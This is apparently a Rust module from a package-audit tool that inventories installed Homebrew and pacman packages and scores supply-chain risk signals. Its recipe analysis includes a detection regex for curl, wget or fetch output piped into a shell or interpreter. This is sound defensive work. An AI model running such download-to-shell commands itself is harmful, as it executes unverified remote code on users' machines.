//! `postmortem system` — audit the machine's **OS-level** package managers.
//!
//! Where `scan`/`tree` read a project's committed lockfiles, `system` inspects
//! what's actually installed on *this* machine by shelling out to the package
//! manager. Homebrew is the first (and today only) backend:
//!
//! - `brew info --json=v2 --installed` — the full installed forest: **formulae**
//!   (with versions, `installed_on_request` roots, and `declared_directly`
//!   dependency edges) and **casks** (apps installed as prebuilt binaries).
//! - `brew tap-info --json --installed` — the configured **source repos** and
//!   their real git remotes. Anything beyond the official `homebrew/*` taps
//!   bypasses core review → a provenance risk.
//!
//! Two risk lenses feed the shared `tree` model:
//! - **provenance** (offline, [`analyze_signals`]): third-party taps, and for
//!   casks the extra supply-chain surface — an unverified download
//!   (`sha256 :no_check`), an insecure/`http` URL, a download host unrelated to
//!   the homepage, a `pkg`/`installer` artifact (elevated install), self-updates,
//!   deprecation.
//! - **reputation** (`--online`): the source repo's stars/age/activity/language,
//!   via the same [`crate::resolve`] resolver (formula `homepage` / cask download
//!   URL → GitHub).

use std::collections::HashMap;
use std::process::Command;

use anyhow::{Context, Result};
use owo_colors::OwoColorize;
use serde::Deserialize;

use crate::model::{DepRef, Dependency, Ecosystem, Severity};
use crate::tree::{Node, Tree};

/// Download hosts that are legitimate release mirrors, so a cask downloading
/// from them while its homepage is elsewhere is normal (not a redirect tell).
const TRUSTED_DL_HOSTS: &[&str] =
    &["github.com", "gitlab.com", "codeberg.org", "sourceforge.net", "bitbucket.org"];

/// A known OS package manager and whether it's usable on this machine.
pub struct Manager {
    pub name: &'static str,
    /// Its CLI is present on `$PATH`.
    pub available: bool,
    /// postmortem has a backend for it (only Homebrew, today).
    pub implemented: bool,
}

/// The managers we recognize. `implemented` marks the ones with a backend; the
/// rest are detected-and-reported so the roadmap is visible.
const KNOWN: &[(&str, &str, bool)] = &[
    ("homebrew", "brew", true),
    ("pacman", "pacman", true),
    ("apt", "apt", false),
    ("dpkg", "dpkg", false),
    ("dnf", "dnf", false),
    ("apk", "apk", false),
    ("macports", "port", false),
];

/// Detect which known package managers are installed on this machine.
pub fn detect() -> Vec<Manager> {
    KNOWN
        .iter()
        .map(|(name, bin, implemented)| Manager {
            name,
            available: in_path(bin),
            implemented: *implemented,
        })
        .collect()
}

/// Is `bin` present as a file on any `$PATH` entry?
fn in_path(bin: &str) -> bool {
    let Some(path) = std::env::var_os("PATH") else {
        return false;
    };
    std::env::split_paths(&path).any(|dir| dir.join(bin).is_file())
}

/// One configured Homebrew tap (a source repo backing installable packages).
pub struct Tap {
    /// Tap handle, e.g. `sn0walice/sshm` or `homebrew/core`.
    pub name: String,
    /// The tap's actual git remote (from `brew tap-info`), e.g.
    /// `https://github.com/Sn0wAlice/sshm`. Empty for official taps (no remote).
    pub remote: String,
    /// An official `homebrew/*` tap (core-reviewed).
    pub official: bool,
}

/// One offline system risk signal attached to a package by name: a label, its
/// severity (drives color + the flagged/unchecked split), and the points it adds
/// to the package's own risk score.
pub struct SysSignal {
    pub label: String,
    pub severity: Severity,
    pub points: u8,
}

impl SysSignal {
    fn new(label: impl Into<String>, severity: Severity, points: u8) -> Self {
        SysSignal { label: label.into(), severity, points }
    }
}

/// One configured source repo, generic across backends (a Homebrew tap, a
/// pacman repo, an apt source, …).
pub struct Repo {
    /// Handle / section name, e.g. `homebrew/core`, `core`, `sn0walice/sshm`.
    pub name: String,
    /// Its URL/remote when known (empty otherwise).
    pub url: String,
    /// A first-party / trusted source (vs. a third-party one).
    pub official: bool,
}

/// The installed inventory for one system manager, in the shared `tree` model.
pub struct Inventory {
    pub manager: &'static str,
    /// Installed packages as `Dependency` nodes.
    pub deps: Vec<Dependency>,
    /// Configured source repos.
    pub repos: Vec<Repo>,
    /// Offline risk signals per package name, merged onto the tree by [`annotate`].
    pub signals: HashMap<String, Vec<SysSignal>>,
    /// A one-line human count, e.g. `117 formula(e) + 2 cask(s)`.
    pub summary: String,
    /// A caveat to surface after loading (e.g. an un-synced pacman DB).
    pub note: Option<String>,
}

/// Options for [`inventory`].
#[derive(Default, Clone, Copy)]
pub struct Opts {
    /// Pull networked provenance during inventory (pacman's AUR RPC).
    pub online: bool,
    /// Force foreign/AUR detection past the un-synced-DB guard (pacman).
    pub force_aur: bool,
}

/// Build the installed inventory for a supported backend. Homebrew ignores
/// `opts` (its reputation comes from the shared `--online` path).
pub fn inventory(manager: &str, opts: Opts) -> Result<Inventory> {
    match manager {
        "homebrew" => brew_inventory(),
        "pacman" => pacman_inventory(opts),
        other => anyhow::bail!("no inventory backend for '{other}'"),
    }
}

// --- Homebrew JSON (`brew info --json=v2 --installed`) --------------------------

#[derive(Deserialize, Default)]
struct BrewOut {
    #[serde(default)]
    formulae: Vec<Formula>,
    #[serde(default)]
    casks: Vec<Cask>,
}

#[derive(Deserialize)]
struct Formula {
    name: String,
    tap: Option<String>,
    #[serde(default)]
    installed: Vec<Installed>,
    #[serde(default)]
    deprecated: bool,
    #[serde(default)]
    disabled: bool,
    /// Presence means the formula installs a launchd/systemd service (persistence).
    #[serde(default)]
    service: Option<serde_json::Value>,
    #[serde(default)]
    bottle: Option<Bottle>,
}

#[derive(Deserialize)]
struct Bottle {
    #[serde(default)]
    stable: Option<BottleStable>,
}

#[derive(Deserialize)]
struct BottleStable {
    /// The registry the prebuilt binary is pulled from. Official bottles live
    /// under `ghcr.io/v2/homebrew/*`; a third-party tap can point elsewhere.
    root_url: Option<String>,
}

#[derive(Deserialize)]
struct Installed {
    version: String,
    #[serde(default)]
    installed_on_request: bool,
    #[serde(default)]
    runtime_dependencies: Vec<RuntimeDep>,
}

#[derive(Deserialize)]
struct RuntimeDep {
    full_name: String,
    /// True when the parent formula declares this dep directly (vs. pulled
    /// transitively) — the signal we use to draw a single graph edge.
    #[serde(default)]
    declared_directly: bool,
}

#[derive(Deserialize)]
struct Cask {
    token: String,
    tap: Option<String>,
    #[serde(default)]
    version: Option<String>,
    #[serde(default)]
    installed: Option<String>,
    url: Option<String>,
    /// A hex digest, or the literal `"no_check"` when the cask declares
    /// `sha256 :no_check` (an unverified download).
    sha256: Option<String>,
    homepage: Option<String>,
    #[serde(default)]
    auto_updates: Option<bool>,
    #[serde(default)]
    deprecated: bool,
    #[serde(default)]
    disabled: bool,
    /// Each entry is a one-key object naming the artifact kind (`app`, `pkg`,
    /// `installer`, `binary`, `zap`, …).
    #[serde(default)]
    artifacts: Vec<serde_json::Value>,
}

/// Read the installed Homebrew forest, casks, and taps into an [`Inventory`].
pub fn brew_inventory() -> Result<Inventory> {
    let out = Command::new("brew")
        .args(["info", "--json=v2", "--installed"])
        .output()
        .context("running `brew info --json=v2 --installed`")?;
    if !out.status.success() {
        anyhow::bail!("`brew info` failed: {}", String::from_utf8_lossy(&out.stderr).trim());
    }
    let (taps, tap_remote) = read_tap_info();
    let Parsed { deps, casks, mut signals, third_party } =
        analyze(&out.stdout, &tap_remote).context("parsing brew JSON")?;

    // Static-analyze the install recipe of each third-party package (its brew
    // Ruby) — the untrusted install code. Core/official recipes are skipped.
    for (name, is_cask) in &third_party {
        for sig in analyze_install_code(name, *is_cask) {
            signals.entry(name.clone()).or_default().push(sig);
        }
    }

    // Version drift is a separate `brew outdated` query, merged into the signals.
    for (name, (installed, current)) in read_outdated() {
        signals.entry(name).or_default().push(outdated_signal(&installed, &current));
    }
    let summary = format!("{} formula(e) + {casks} cask(s)", deps.len() - casks);
    let repos = taps
        .into_iter()
        .map(|t| Repo { name: t.name, url: t.remote, official: t.official })
        .collect();
    Ok(Inventory { manager: "homebrew", deps, repos, signals, summary, note: None })
}

/// The output of [`analyze`]: the packages (formulae forest + cask roots), the
/// cask count, the offline risk signals keyed by package name, and the list of
/// third-party packages `(name, is_cask)` whose install recipe should be
/// statically analyzed (core/official recipes are review-gated, so skipped).
struct Parsed {
    deps: Vec<Dependency>,
    casks: usize,
    signals: HashMap<String, Vec<SysSignal>>,
    third_party: Vec<(String, bool)>,
}

/// Turn `brew info --json=v2` output into the dependency forest, the cask count,
/// and the offline risk signals. `tap_remote` maps a tap handle to its real git
/// remote (used to point a third-party package at its tap's repo). Split from the
/// shell-out so it's unit-testable against a fixture.
fn analyze(json: &[u8], tap_remote: &HashMap<String, String>) -> Result<Parsed> {
    let parsed: BrewOut = serde_json::from_slice(json)?;
    let mut signals: HashMap<String, Vec<SysSignal>> = HashMap::new();
    let mut third_party: Vec<(String, bool)> = Vec::new();

    // --- formulae: the dependency forest ---
    let version: HashMap<&str, &str> = parsed
        .formulae
        .iter()
        .filter_map(|f| f.installed.first().map(|i| (f.name.as_str(), i.version.as_str())))
        .collect();

    // Invert declared-direct edges into a parent map: dep → its declaring
    // formulae. tree::build re-inverts this into the child forest.
    let mut parents: HashMap<String, Vec<DepRef>> = HashMap::new();
    for f in &parsed.formulae {
        let Some(inst) = f.installed.first() else { continue };
        for rd in &inst.runtime_dependencies {
            if rd.declared_directly && version.contains_key(rd.full_name.as_str()) {
                parents
                    .entry(rd.full_name.clone())
                    .or_default()
                    .push((f.name.clone(), inst.version.clone()));
            }
        }
    }

    let mut deps = Vec::with_capacity(parsed.formulae.len() + parsed.casks.len());
    for f in &parsed.formulae {
        let Some(inst) = f.installed.first() else { continue };
        // Third-party tap → provenance signal + carry the tap's remote so the
        // resolver assesses the tap repo instead of reporting "no repository",
        // and mark it for install-recipe analysis.
        let tap = f.tap.as_deref().filter(|t| !is_official_tap(t));
        if let Some(t) = tap {
            push_signal(&mut signals, &f.name, third_party_tap(t));
            third_party.push((f.name.clone(), false));
            if let Some(sig) = tap_remote.get(t).and_then(|r| tap_remote_signal(r)) {
                push_signal(&mut signals, &f.name, sig);
            }
        }
        if f.deprecated || f.disabled {
            push_signal(&mut signals, &f.name, deprecated_signal());
        }
        // Persistence: installs a background service that runs at boot/login.
        if f.service.is_some() {
            push_signal(&mut signals, &f.name, service_signal());
        }
        // Bottle provenance: a prebuilt binary pulled from a non-official host.
        if let Some(host) = f
            .bottle
            .as_ref()
            .and_then(|b| b.stable.as_ref())
            .and_then(|s| s.root_url.as_deref())
            .filter(|r| !is_official_bottle(r))
            .and_then(host_domain)
        {
            push_signal(&mut signals, &f.name, unofficial_bottle_signal(&host));
        }
        deps.push(Dependency {
            name: f.name.clone(),
            version: inst.version.clone(),
            ecosystem: Ecosystem::Brew,
            direct: inst.installed_on_request,
            resolved_url: tap.and_then(|t| tap_remote.get(t).cloned()),
            integrity: None,
            parents: parents.remove(&f.name).unwrap_or_default(),
        });
    }

    // --- casks: flat roots + the extra download/artifact risk surface ---
    let casks = parsed.casks.len();
    for c in &parsed.casks {
        let mut sigs = cask_signals(c);
        if let Some(tap) = c.tap.as_deref().filter(|t| !is_official_tap(t)) {
            sigs.push(third_party_tap(tap));
            third_party.push((c.token.clone(), true));
            if let Some(sig) = tap_remote.get(tap).and_then(|r| tap_remote_signal(r)) {
                sigs.push(sig);
            }
        }
        if !sigs.is_empty() {
            signals.entry(c.token.clone()).or_default().extend(sigs);
        }
        deps.push(Dependency {
            name: c.token.clone(),
            version: c.installed.clone().or_else(|| c.version.clone()).unwrap_or_default(),
            ecosystem: Ecosystem::Brew,
            direct: true, // casks are always user-installed
            // The download URL is often a GitHub release → resolves to the repo.
            resolved_url: c.url.clone(),
            integrity: c.sha256.clone(),
            parents: Vec::new(),
        });
    }

    Ok(Parsed { deps, casks, signals, third_party })
}

/// The provenance signal for a package installed from a non-official tap.
fn third_party_tap(tap: &str) -> SysSignal {
    SysSignal::new(format!("third-party-tap ({tap})"), Severity::Medium, 30)
}

/// A deprecated/disabled package — unmaintained, likely to accrue unfixed bugs.
fn deprecated_signal() -> SysSignal {
    SysSignal::new("deprecated", Severity::Medium, 20)
}

/// An installed version behind the current one — running old code means missing
/// upstream (including security) fixes. Mild on its own.
fn outdated_signal(installed: &str, current: &str) -> SysSignal {
    SysSignal::new(format!("outdated ({installed} → {current})"), Severity::Low, 10)
}

/// The formula installs a launchd/systemd service — it runs automatically at
/// boot/login. Higher attack surface; informational (many are legitimate).
fn service_signal() -> SysSignal {
    SysSignal::new("installs-service (runs at boot/login)", Severity::Info, 0)
}

/// The prebuilt binary is pulled from a bottle registry outside Homebrew's
/// official `ghcr.io/v2/homebrew/*` — an arbitrary binary host.
fn unofficial_bottle_signal(host: &str) -> SysSignal {
    SysSignal::new(format!("unofficial-bottle ({host})"), Severity::Medium, 30)
}

/// Is a bottle `root_url` Homebrew's official registry?
fn is_official_bottle(root_url: &str) -> bool {
    root_url.contains("ghcr.io/v2/homebrew/")
}

/// Flag a tap whose git remote is insecure (`http`) or on a host we can't vouch
/// for. `None` for an https remote on a known code host.
fn tap_remote_signal(remote: &str) -> Option<SysSignal> {
    if remote.starts_with("http://") {
        return Some(SysSignal::new("insecure-tap-remote (http)", Severity::High, 40));
    }
    match host_domain(remote) {
        Some(host) if !TRUSTED_DL_HOSTS.contains(&host.as_str()) => {
            Some(SysSignal::new(format!("exotic-tap-host ({host})"), Severity::Low, 10))
        }
        _ => None,
    }
}

fn push_signal(map: &mut HashMap<String, Vec<SysSignal>>, name: &str, sig: SysSignal) {
    map.entry(name.to_string()).or_default().push(sig);
}

/// Cask-specific risk signals derived from its metadata: the download-and-run
/// surface a cask carries that a source-built formula doesn't.
fn cask_signals(c: &Cask) -> Vec<SysSignal> {
    let mut out = Vec::new();

    // An unverified download — brew runs whatever bytes arrive, no integrity pin.
    if c.sha256.as_deref() == Some("no_check") {
        out.push(SysSignal::new("unverified-download (sha256 :no_check)", Severity::High, 40));
    }
    if let Some(url) = &c.url {
        if url.starts_with("http://") {
            out.push(SysSignal::new("insecure-url (http)", Severity::High, 40));
        }
        // Download host unrelated to the homepage and not a known release mirror.
        if let (Some(home), Some(dl)) =
            (c.homepage.as_deref().and_then(host_domain), host_domain(url))
            && dl != home
            && !TRUSTED_DL_HOSTS.contains(&dl.as_str())
        {
            out.push(SysSignal::new(format!("download-host-mismatch ({dl})"), Severity::Low, 10));
        }
    }
    // A pkg/installer artifact runs an installer (elevated) rather than a plain
    // app drop — worth surfacing (informational).
    if c.artifacts.iter().any(is_installer_artifact) {
        out.push(SysSignal::new("runs-installer", Severity::Info, 0));
    }
    // Self-updating outside brew — later versions bypass this audit.
    if c.auto_updates == Some(true) {
        out.push(SysSignal::new("auto-updates", Severity::Info, 0));
    }
    if c.deprecated || c.disabled {
        out.push(deprecated_signal());
    }
    out
}

/// `brew outdated --json` → installed packages behind their current version,
/// mapped `name → (installed, current)`. Best-effort: a failure yields none.
fn read_outdated() -> HashMap<String, (String, String)> {
    #[derive(Deserialize)]
    struct Out {
        name: String,
        #[serde(default)]
        installed_versions: Vec<String>,
        #[serde(default)]
        current_version: Option<String>,
    }
    #[derive(Deserialize, Default)]
    struct OutAll {
        #[serde(default)]
        formulae: Vec<Out>,
        #[serde(default)]
        casks: Vec<Out>,
    }
    let Ok(out) = Command::new("brew").args(["outdated", "--json"]).output() else {
        return HashMap::new();
    };
    if !out.status.success() {
        return HashMap::new();
    }
    let all: OutAll = serde_json::from_slice(&out.stdout).unwrap_or_default();
    all.formulae
        .into_iter()
        .chain(all.casks)
        .filter_map(|x| {
            let cur = x.current_version?;
            let inst = x.installed_versions.first().cloned().unwrap_or_default();
            Some((x.name, (inst, cur)))
        })
        .collect()
}

// --- pacman backend (`pacman -Qi`) -------------------------------------------

/// Read the installed pacman forest into an [`Inventory`]. `pacman -Qi` dumps
/// every installed package's info in one call: name, version, deps, URL,
/// signature status, install-reason (explicit vs pulled-in), and whether it
/// ships an install hook. `online` additionally enriches foreign/AUR packages
/// via the AUR RPC.
pub fn pacman_inventory(opts: Opts) -> Result<Inventory> {
    let out = Command::new("pacman").arg("-Qi").output().context("running `pacman -Qi`")?;
    if !out.status.success() {
        anyhow::bail!("`pacman -Qi` failed: {}", String::from_utf8_lossy(&out.stderr).trim());
    }
    let (deps, mut signals) = pacman_graph(&String::from_utf8_lossy(&out.stdout));

    // Foreign packages (not from an official repo) = AUR builds / manual installs
    // — the untrusted surface. An un-synced sync-DB reports ~everything foreign,
    // which is useless, so it's skipped unless forced.
    let raw = read_foreign();
    let unsynced = !raw.is_empty() && raw.len() * 10 >= deps.len() * 9;
    let mut note = None;
    let foreign = if unsynced && !opts.force_aur {
        note = Some(
            "package DB not synced, so AUR/foreign detection is unavailable. \
             Run `sudo pacman -Sy` first, or pass --force-aur to scan anyway."
                .to_string(),
        );
        Vec::new()
    } else {
        raw
    };

    if !foreign.is_empty() {
        let aur = if opts.online { aur_info(&foreign) } else { HashMap::new() };
        let version_of: HashMap<&str, &str> =
            deps.iter().map(|d| (d.name.as_str(), d.version.as_str())).collect();
        for name in &foreign {
            for sig in foreign_signals(aur.get(name)) {
                push_signal(&mut signals, name, sig);
            }
            // Static-analyze the local `.install` hook (the shell that runs on
            // this machine at install/upgrade/removal) — offline.
            if let Some(ver) = version_of.get(name.as_str()) {
                for sig in analyze_pacman_install(name, ver) {
                    push_signal(&mut signals, name, sig);
                }
            }
            // Static-analyze the AUR PKGBUILD (the untrusted build recipe) — online.
            if opts.online
                && aur.contains_key(name)
                && let Some(pkgbuild) = fetch_pkgbuild(name)
            {
                for sig in analyze_recipe(name, &pkgbuild, "sh") {
                    push_signal(&mut signals, name, sig);
                }
            }
        }
    }

    // Version drift (needs a synced DB; best-effort).
    for (name, (old, new)) in read_pacman_outdated() {
        signals.entry(name).or_default().push(outdated_signal(&old, &new));
    }

    let explicit = deps.iter().filter(|d| d.direct).count();
    let extra = if foreign.is_empty() {
        String::new()
    } else {
        format!(", {} foreign", foreign.len())
    };
    let summary = format!("{} package(s) ({explicit} explicit{extra})", deps.len());
    Ok(Inventory { manager: "pacman", deps, repos: pacman_repos(), signals, summary, note })
}

// --- AUR (foreign packages + aur.archlinux.org RPC) --------------------------

const UA: &str = concat!("postmortem/", env!("CARGO_PKG_VERSION"));

/// Installed packages not provided by any sync repo (`pacman -Qm`) — AUR builds
/// and manual installs. The caller applies the un-synced-DB guard.
fn read_foreign() -> Vec<String> {
    let Ok(out) = Command::new("pacman").arg("-Qm").output() else {
        return Vec::new();
    };
    if !out.status.success() {
        return Vec::new();
    }
    String::from_utf8_lossy(&out.stdout)
        .lines()
        .filter_map(|l| l.split_whitespace().next().map(str::to_string))
        .collect()
}

#[derive(Deserialize, Default)]
struct AurResp {
    #[serde(default)]
    results: Vec<AurPkg>,
}

#[derive(Deserialize)]
struct AurPkg {
    #[serde(rename = "Name")]
    name: String,
    #[serde(rename = "Maintainer")]
    maintainer: Option<String>,
    #[serde(rename = "OutOfDate")]
    out_of_date: Option<i64>,
    #[serde(rename = "NumVotes")]
    num_votes: Option<i64>,
}

/// Query the AUR RPC v5 `info` endpoint (batched) for a set of package names.
/// Best-effort: network failures yield an empty map.
fn aur_info(names: &[String]) -> HashMap<String, AurPkg> {
    let agent = ureq::AgentBuilder::new().timeout(std::time::Duration::from_secs(15)).build();
    let mut out = HashMap::new();
    for chunk in names.chunks(120) {
        let query: String = chunk.iter().map(|n| format!("&arg[]={n}")).collect();
        let url =
            format!("https://aur.archlinux.org/rpc/v5/info?{}", query.trim_start_matches('&'));
        let Ok(resp) = agent.get(&url).set("User-Agent", UA).call() else {
            continue;
        };
        let Ok(text) = resp.into_string() else { continue };
        if let Ok(parsed) = serde_json::from_str::<AurResp>(&text) {
            out.extend(parsed.results.into_iter().map(|p| (p.name.clone(), p)));
        }
    }
    out
}

/// Static-analyze a foreign package's local `.install` hook (shell), if any. The
/// hook lives on-disk and runs on this machine, so this is offline.
fn analyze_pacman_install(name: &str, version: &str) -> Vec<SysSignal> {
    let path = format!("/var/lib/pacman/local/{name}-{version}/install");
    match std::fs::read_to_string(&path) {
        Ok(code) => analyze_recipe(name, &code, "sh"),
        Err(_) => Vec::new(),
    }
}

/// Fetch a package's AUR PKGBUILD (its untrusted build recipe). Best-effort.
fn fetch_pkgbuild(name: &str) -> Option<String> {
    let agent = ureq::AgentBuilder::new().timeout(std::time::Duration::from_secs(15)).build();
    let url = format!("https://aur.archlinux.org/cgit/aur.git/plain/PKGBUILD?h={name}");
    agent.get(&url).set("User-Agent", UA).call().ok()?.into_string().ok()
}

/// `pacman -Qu` → packages behind the synced repos, `name → (installed, current)`.
/// Best-effort: needs a synced DB, empty otherwise.
fn read_pacman_outdated() -> HashMap<String, (String, String)> {
    let Ok(out) = Command::new("pacman").arg("-Qu").output() else {
        return HashMap::new();
    };
    if !out.status.success() {
        return HashMap::new();
    }
    String::from_utf8_lossy(&out.stdout)
        .lines()
        .filter_map(|l| {
            // "name old_ver -> new_ver [ignored]"
            let mut p = l.split_whitespace();
            let name = p.next()?.to_string();
            let old = p.next()?.to_string();
            if p.next() != Some("->") {
                return None;
            }
            Some((name, (old, p.next()?.to_string())))
        })
        .collect()
}

/// Signals for one foreign package: always `foreign-package`, plus AUR RPC
/// provenance (orphaned / out-of-date / unpopular) when the metadata is present.
fn foreign_signals(aur: Option<&AurPkg>) -> Vec<SysSignal> {
    let mut v = vec![SysSignal::new(
        "foreign-package (not from an official repo)",
        Severity::Medium,
        30,
    )];
    if let Some(p) = aur {
        if p.maintainer.is_none() {
            v.push(SysSignal::new("aur-orphaned (no maintainer)", Severity::Medium, 30));
        }
        if p.out_of_date.is_some() {
            v.push(SysSignal::new("aur-out-of-date", Severity::Medium, 20));
        }
        let votes = p.num_votes.unwrap_or(0);
        if votes < 10 {
            v.push(SysSignal::new(format!("aur-unpopular ({votes} votes)"), Severity::Low, 10));
        }
    }
    v
}

/// Parse `pacman -Qi` output (blank-line-separated `Key : Value` blocks) into a
/// dependency forest + offline signals (`unsigned`, `install-script`).
fn pacman_graph(text: &str) -> (Vec<Dependency>, HashMap<String, Vec<SysSignal>>) {
    struct P {
        name: String,
        version: String,
        url: String,
        depends: Vec<String>,
        explicit: bool,
        unsigned: bool,
        has_install: bool,
    }
    let mut pkgs: Vec<P> = Vec::new();
    for block in text.split("\n\n") {
        let (mut name, mut version, mut url) = (String::new(), String::new(), String::new());
        let (mut depends, mut explicit, mut unsigned, mut has_install) =
            (Vec::new(), false, false, false);
        for line in block.lines() {
            let Some((k, v)) = line.split_once(':') else { continue };
            let (k, v) = (k.trim(), v.trim());
            match k {
                "Name" => name = v.to_string(),
                "Version" => version = v.to_string(),
                "URL" => url = v.to_string(),
                "Depends On" if v != "None" => {
                    depends = v.split_whitespace().filter_map(pacman_dep_name).collect();
                }
                "Install Reason" => explicit = v.starts_with("Explicitly"),
                "Validated By" => unsigned = v == "None",
                "Install Script" => has_install = v == "Yes",
                _ => {}
            }
        }
        if !name.is_empty() {
            pkgs.push(P { name, version, url, depends, explicit, unsigned, has_install });
        }
    }

    let installed: HashMap<&str, &str> =
        pkgs.iter().map(|p| (p.name.as_str(), p.version.as_str())).collect();
    let mut parents: HashMap<String, Vec<DepRef>> = HashMap::new();
    for p in &pkgs {
        for d in &p.depends {
            if installed.contains_key(d.as_str()) {
                parents.entry(d.clone()).or_default().push((p.name.clone(), p.version.clone()));
            }
        }
    }

    let mut signals: HashMap<String, Vec<SysSignal>> = HashMap::new();
    let mut deps = Vec::with_capacity(pkgs.len());
    for p in &pkgs {
        if p.unsigned {
            push_signal(&mut signals, &p.name, SysSignal::new("unsigned", Severity::High, 40));
        }
        if p.has_install {
            push_signal(
                &mut signals,
                &p.name,
                SysSignal::new("install-script (runs code at install)", Severity::Info, 0),
            );
        }
        deps.push(Dependency {
            name: p.name.clone(),
            version: p.version.clone(),
            ecosystem: Ecosystem::Pacman,
            direct: p.explicit,
            resolved_url: (!p.url.is_empty()).then(|| p.url.clone()),
            integrity: None,
            parents: parents.remove(&p.name).unwrap_or_default(),
        });
    }
    (deps, signals)
}

/// A pacman `Depends On` token → package name: strip a version constraint
/// (`glibc>=2.0` → `glibc`) and drop soname deps (`libreadline.so=8-64`), which
/// are provided by an already-listed package.
fn pacman_dep_name(tok: &str) -> Option<String> {
    if tok.contains(".so") {
        return None;
    }
    let name = tok.split(['>', '<', '=']).next()?.trim();
    (!name.is_empty()).then(|| name.to_string())
}

/// Configured pacman repos from `/etc/pacman.conf`. Arch/ALARM official sections
/// are trusted; anything else is third-party.
fn pacman_repos() -> Vec<Repo> {
    const OFFICIAL: &[&str] = &[
        "core", "extra", "multilib", "testing", "core-testing", "extra-testing",
        "multilib-testing", "community", "community-testing", "alarm", "aur-disabled",
    ];
    let Ok(text) = std::fs::read_to_string("/etc/pacman.conf") else {
        return Vec::new();
    };
    text.lines()
        .filter_map(|l| l.trim().strip_prefix('[')?.strip_suffix(']').map(str::to_string))
        .filter(|s| s != "options")
        .map(|s| {
            let official = OFFICIAL.contains(&s.as_str());
            Repo { name: s, url: String::new(), official }
        })
        .collect()
}

// --- install-recipe static analysis (third-party packages only) --------------

/// Fetch a package's Homebrew recipe (its Ruby) via `brew cat` and static-analyze
/// it. Only called for third-party packages — the untrusted install code.
fn analyze_install_code(name: &str, is_cask: bool) -> Vec<SysSignal> {
    match brew_cat(name, is_cask) {
        Some(ruby) => analyze_recipe(name, &ruby, "rb"),
        None => Vec::new(),
    }
}

/// `brew cat [--cask] <name>` → the recipe's Ruby source.
fn brew_cat(name: &str, is_cask: bool) -> Option<String> {
    let mut cmd = Command::new("brew");
    cmd.arg("cat");
    if is_cask {
        cmd.arg("--cask");
    }
    let out = cmd.arg(name).output().ok()?;
    out.status
        .success()
        .then(|| String::from_utf8_lossy(&out.stdout).into_owned())
}

/// Static-analyze an install recipe's source (a Homebrew Ruby formula, an Arch
/// PKGBUILD / `.install` shell hook, …). Stages the code as `recipe.<ext>` and
/// runs the full analyzer suite over it (matched by extension), plus a pass for
/// install-time remote code execution. Subprocess-free, so unit-testable on a
/// raw string.
fn analyze_recipe(name: &str, code: &str, ext: &str) -> Vec<SysSignal> {
    let mut sigs = Vec::new();

    if let Some(dir) = stage_recipe(name, code, ext) {
        let findings = crate::analyze::scan_source_tree(&dir);
        let _ = std::fs::remove_dir_all(&dir);
        // Cap so one noisy recipe can't flood the node with signals.
        sigs.extend(findings.iter().take(6).map(finding_to_signal));
    }

    // Piping a download straight into a shell/interpreter during install — the
    // clearest install-time remote-code-execution tell.
    let pipe = regex::Regex::new(r"(?i)(curl|wget|fetch)\b[^\n|]*\|\s*(sudo\s+)?(sh|bash|zsh|ruby|python)")
        .expect("static regex");
    if pipe.is_match(code) {
        sigs.push(SysSignal::new("install-remote-exec (pipe to shell)", Severity::High, 40));
    }
    sigs
}

/// A finding from a language analyzer → a system signal, e.g.
/// `install-ioc (203.0.113.5)`. Points scale with severity.
fn finding_to_signal(f: &crate::model::Finding) -> SysSignal {
    let points = match f.severity {
        Severity::Critical | Severity::High => 40,
        Severity::Medium => 20,
        Severity::Low => 10,
        Severity::Info => 0,
    };
    let label =
        format!("install-{} ({})", f.category.as_str(), crate::analyze::util::snippet(&f.detail, 40));
    SysSignal::new(label, f.severity, points)
}

/// Write a recipe to a fresh temp dir as `recipe.<ext>`, so the directory-oriented
/// analyzers pick it up by extension. Returns the dir (caller removes it).
fn stage_recipe(name: &str, code: &str, ext: &str) -> Option<std::path::PathBuf> {
    let safe: String =
        name.chars().map(|c| if c.is_ascii_alphanumeric() { c } else { '_' }).collect();
    let dir = std::env::temp_dir().join(format!("postmortem-recipe-{}-{safe}", std::process::id()));
    std::fs::create_dir_all(&dir).ok()?;
    std::fs::write(dir.join(format!("recipe.{ext}")), code).ok()?;
    Some(dir)
}

/// A cask artifact that runs an installer (`pkg`/`installer`) rather than just
/// dropping an `.app`.
fn is_installer_artifact(a: &serde_json::Value) -> bool {
    a.as_object().is_some_and(|o| o.contains_key("pkg") || o.contains_key("installer"))
}

/// The registrable-ish domain of a URL's host — the last two dot-labels
/// (`dl.google.com` → `google.com`, `github.com` → `github.com`). Naive for
/// multi-part TLDs (`co.uk`), which is acceptable for a coarse host comparison.
fn host_domain(url: &str) -> Option<String> {
    let rest = url.split("://").nth(1).unwrap_or(url);
    let host = rest.split(['/', '?', '#']).next()?;
    let host = host.rsplit('@').next()?; // strip any userinfo
    let host = host.split(':').next()?; // strip port
    let labels: Vec<&str> = host.split('.').filter(|s| !s.is_empty()).collect();
    if labels.len() < 2 {
        return None;
    }
    Some(labels[labels.len() - 2..].join("."))
}

/// `brew tap-info --json --installed` → the configured taps with their **real**
/// git remotes (taps don't follow a fixed `homebrew-<name>` naming; the remote
/// is authoritative, e.g. `sn0walice/sshm` → `github.com/Sn0wAlice/sshm`).
/// Returns the taps plus a `handle → remote` map for the non-official ones (used
/// to resolve their packages). Best-effort: a failure yields none.
fn read_tap_info() -> (Vec<Tap>, HashMap<String, String>) {
    #[derive(Deserialize)]
    struct TapInfo {
        name: String,
        remote: Option<String>,
        #[serde(default)]
        official: bool,
    }
    let Ok(out) = Command::new("brew").args(["tap-info", "--json", "--installed"]).output() else {
        return (Vec::new(), HashMap::new());
    };
    if !out.status.success() {
        return (Vec::new(), HashMap::new());
    }
    let infos: Vec<TapInfo> = serde_json::from_slice(&out.stdout).unwrap_or_default();

    let mut taps = Vec::with_capacity(infos.len());
    let mut remotes = HashMap::new();
    for t in infos {
        if let Some(r) = &t.remote
            && !t.official
        {
            remotes.insert(t.name.clone(), r.clone());
        }
        taps.push(Tap { name: t.name, remote: t.remote.unwrap_or_default(), official: t.official });
    }
    (taps, remotes)
}

/// An official `homebrew/*` tap (core-reviewed, trusted).
fn is_official_tap(tap: &str) -> bool {
    tap.starts_with("homebrew/")
}

// --- risk annotation ----------------------------------------------------------

/// Merge the offline system signals onto the tree, keyed by package name. Each
/// signal raises the node's severity (to at least its own) and adds its risk
/// points, so a package can carry several (e.g. a cask that is both an
/// unverified download and from a third-party tap). Run after
/// [`crate::tree::enrich`] (online) and before [`crate::tree::score`], so
/// `risk:dep` reflects both provenance and repo reputation.
